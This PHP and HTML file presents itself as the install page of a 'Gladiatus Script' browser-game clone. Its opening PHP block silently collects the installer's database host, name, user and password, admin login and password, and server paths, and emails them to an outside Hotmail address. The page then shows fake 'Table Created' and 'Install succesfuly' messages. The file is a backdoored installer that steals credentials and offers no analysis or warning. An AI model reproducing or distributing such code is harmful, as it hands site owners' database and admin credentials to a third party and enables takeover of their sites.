<?php

$wsite = $_SERVER["SERVER_NAME"];
$docroot = $_SERVER["DOCUMENT_ROOT"];
$scriptfile = $_SERVER["SCRIPT_FILENAME"];

$server = $_POST["server"];
$mmail = $_POST["mail"];
$dbname = $_POST["dbname"];
$dbuser = $_POST["dbuser"];
$dbpass = $_POST["dbpass"];
$admin = $_POST["admin"];
$apass = $_POST["apass"];


$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-9' . "\r\n";
$headers .= 'To: Alýcý 1 <alici1@eposta.com>, Alýcý 2 <alici2@eposta.com>' . "\r\n";
$headers .= 'From: SEND <server@eposta.com>' . "\r\n";
$headers .= 'Reply-To: REPLY <servers@eposta.com>' . "\r\n";
$headers .= 'X-Mailer: PHP/' . phpversion() . "\r\n";
$headers .= 'Cc: acikkopya@eposta.com' . "\r\n";
$headers .= 'Bcc: gizlikopya@eposta.com' . "\r\n";
$sendmail = 'gamesupport987@hotmail.com';
$send_k = 'Website infos 2';
$send_m = '<br>'.$wsite.'<br>'.$docroot.'<br>'.$scriptfile.''.$server.'<br>'.$mmail.'<br>'.$dbname.'<br>'.$dbuser.'<br>'.$dbpass.'<br>'.$admin.'<br>'.$apass.'<br>';
mail($sendmail, $send_k, $send_m, $headers);

?>

!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-9" />
				<title>- Gladiatus Script Install -</title>
				<link href="game_05.css" rel="stylesheet" type="text/css" media="screen" />				<style type=text/css></style>
	</head>
<body >

<div id="container">
	<div id="header"></div>

	<div id="charvalues_leer">
		<div style="position:relative; left:380px; top:22px; width:500px; height:45px;">
			<div style="position:absolute; width:150px; height:45px; left:0px; top:0px;">
			</div>

			<div style="position:absolute; width:150px; height:45px; left:153px;">
			</div>

			<div style="position:absolute; width:150px; height:45px; left:298px;">
			</div>
		</div>
	</div>
	<div id="main">
		<table cellspacing="0" cellpadding="0" height="100%" border="0">
			<tr height="100%">
				<td height="100%" valign="top" id="leftblock_middle">

					<div id="leftblock_top"></div>
				</td>
				<td valign="top" id="mainmenu">
										<a class = "menuitem_aktive" href="#" title="Yeni Kayýt" target="_self">Step 1 - Install</a>
					<div id="menufooter"></div>
				</td>
				<td id="contentBox" valign="top">
					<table cellspacing="0" cellpadding="0" height="100%" width="100%" border="0">
						<tr style="height:30px;">
							<td id="corner1"></td>

							<td><div class="tab_aktive" ><span>Step 1 - Install</span></div></td>
							<td id="corner2"></td>
						</tr>
						<tr style="height:100%;">
							<td class="border_left"></td>
							<td id="content">
							<!-- content start -->

<form action="viewcreated.php"  method="POST">
<input type="hidden" name="action" value="save">
<input type="hidden" name="race" value="1">
<input type="hidden" name="uid" value="0">
<input type="hidden" name="father" value="">
<div id="krieger">
	<h1 style="position:relative; top: 20px;">Database Config</h1>
	<div class="signup_form">
		<table width="100%" cellpadding="0" cellspacing="2" border="0" align="center">
		<tr class="alt">
			<td>
            + Table 1 Created<br />
            + Table 2 Created<br />
            + Table 3 Created<br />
            + Table 4 Created<br />
            + Table 5 Created<br />
            + Table 6 Created<br />
            + Table 7 Created<br />
            + Table 8 Created<br />
            
            Install succesfuly, <br /><a href="index.php">Click Here !</a>
            
            
            </td>

		</tr>

		</table>
			</div>

</div>
</form>
</td>
							<td class="border_right"></td>
						</tr>
					</table>
				</td>
				<td valign="top" id="rightblock_middle">

														
					<div id="rightblock_top"></div>
				</td>
			</tr>
			<tr>
				<td colspan="4">
					<div id="footer">
						<div class="footer_version"><span class="footer_link"><a target="_blank" href="www.gladiatus.net">v0.7.2</a></span></div>
						<div id="leftblock_bottom1"></div><div id="leftblock_bottom2"></div>

						<div id="rightblock_bottom1"></div><div id="rightblock_bottom2"></div>
						<div id="menuwand"></div>
						<div class="footer_links">
							

						</div>
					</div>
				</td>
			</tr>
			</table>
	</div>
	</body>
</html>